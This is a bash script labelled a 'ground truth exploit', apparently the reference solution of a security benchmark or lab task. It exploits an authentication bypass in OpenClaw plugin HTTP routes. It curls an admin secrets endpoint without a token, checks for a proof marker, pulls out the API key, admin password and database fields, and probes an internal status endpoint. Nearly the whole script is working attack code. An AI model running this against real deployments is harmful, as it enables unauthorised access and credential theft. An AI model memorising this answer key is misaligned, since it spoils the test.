#!/bin/bash
# OpenClaw Plugin HTTP Auth Bypass - Ground Truth Exploit
# Demonstrates authentication bypass via plugin HTTP routes

set -e

echo "=========================================="
echo "OpenClaw Plugin HTTP Auth Bypass Exploit"
echo "=========================================="
echo ""

TARGET="http://openclaw:18789"

echo "[1/5] Waiting for target gateway..."

for i in {1..30}; do
    if curl -s "$TARGET/api/admin/status" >/dev/null 2>&1; then
        echo "[✓] Target gateway is reachable"
        break
    fi
    if [ $i -eq 30 ]; then
        echo "[✗] Target timeout"
        exit 1
    fi
    sleep 1
done

echo ""
echo "[2/5] Analyzing target configuration..."
echo ""
echo "Target: $TARGET"
echo "Vulnerable Endpoints:"
echo "  - /api/admin/secrets (sensitive credentials)"
echo "  - /api/admin/status (internal information)"
echo ""
echo "Expected Authentication: Gateway token required"
echo "Actual Authentication: NONE (bypassed for plugin routes!)"
echo ""

echo "[3/5] Executing authentication bypass attack..."
echo ""
echo "Attack Vector: Direct HTTP access to plugin route without auth"
echo ""
echo "PoC Command:"
echo "  curl $TARGET/api/admin/secrets"
echo ""

# Execute the authentication bypass attack
echo "Executing exploit..."
RESPONSE=$(curl -s -w "\nHTTP_CODE:%{http_code}" "$TARGET/api/admin/secrets")
HTTP_CODE=$(echo "$RESPONSE" | grep "HTTP_CODE" | cut -d: -f2)
BODY=$(echo "$RESPONSE" | grep -v "HTTP_CODE")

echo ""
echo "[*] HTTP Response Code: $HTTP_CODE"

if [ "$HTTP_CODE" != "200" ]; then
    echo "[✗] Attack failed - unexpected HTTP code"
    echo "Response: $BODY"
    exit 1
fi

echo "[✓] HTTP 200 - Request succeeded WITHOUT authentication!"
echo ""
echo "[*] Response from plugin endpoint:"
echo "$BODY" | jq . 2>/dev/null || echo "$BODY"
echo ""

# Save response
echo "$BODY" > /workspace/bypass_result.txt
echo "[✓] Response saved to /workspace/bypass_result.txt"

echo ""
echo "[4/5] Verifying exploitation success..."

# Check for proof marker
if echo "$BODY" | grep -q "OPENCLAW-PLUGIN-HTTP-BYPASS-VERIFIED"; then
    echo "[✓] AUTHENTICATION BYPASS CONFIRMED!"
    echo "    Proof marker found: OPENCLAW-PLUGIN-HTTP-BYPASS-VERIFIED"
else
    echo "[✗] Proof marker not found"
    exit 1
fi

# Check for sensitive data
if echo "$BODY" | grep -q "api_key\|admin_password"; then
    echo "[✓] Sensitive credentials exposed!"

    # Extract and display credentials
    API_KEY=$(echo "$BODY" | jq -r '.api_key' 2>/dev/null || echo "N/A")
    ADMIN_PASS=$(echo "$BODY" | jq -r '.admin_password' 2>/dev/null || echo "N/A")
    DATABASE=$(echo "$BODY" | jq -r '.database' 2>/dev/null || echo "N/A")

    echo ""
    echo "Exfiltrated Credentials:"
    echo "  API Key: $API_KEY"
    echo "  Admin Password: $ADMIN_PASS"
    echo "  Database: $DATABASE"
fi

echo ""
echo "[5/5] Testing additional plugin endpoints..."
echo ""

# Test status endpoint
echo "Testing: $TARGET/api/admin/status"
STATUS_RESPONSE=$(curl -s "$TARGET/api/admin/status")
echo "$STATUS_RESPONSE" | jq . 2>/dev/null || echo "$STATUS_RESPONSE"

if echo "$STATUS_RESPONSE" | grep -q "internal_services"; then
    echo ""
    echo "[✓] Internal service information exposed:"
    echo "$STATUS_RESPONSE" | jq '.internal_services' 2>/dev/null || echo "Could not parse"
fi

echo ""
echo "=========================================="
echo "[SUCCESS] Authentication Bypass Complete"
echo "=========================================="
echo ""
echo "Impact Demonstrated:"
echo "  ✓ Plugin HTTP routes accessible without gateway authentication"
echo "  ✓ Sensitive credentials (API keys, passwords) exfiltrated"
echo "  ✓ Internal service information disclosed"
echo "  ✓ Gateway auth token NOT required for plugin endpoints"
echo ""
echo "Vulnerability Confirmed:"
echo "  Location: src/gateway/server/plugins-http.ts:12"
echo "  Issue: createGatewayPluginRequestHandler() does not check auth"
echo "  Impact: Complete authentication bypass for plugin HTTP routes"
echo ""
echo "Results saved to: /workspace/bypass_result.txt"
echo "=========================================="
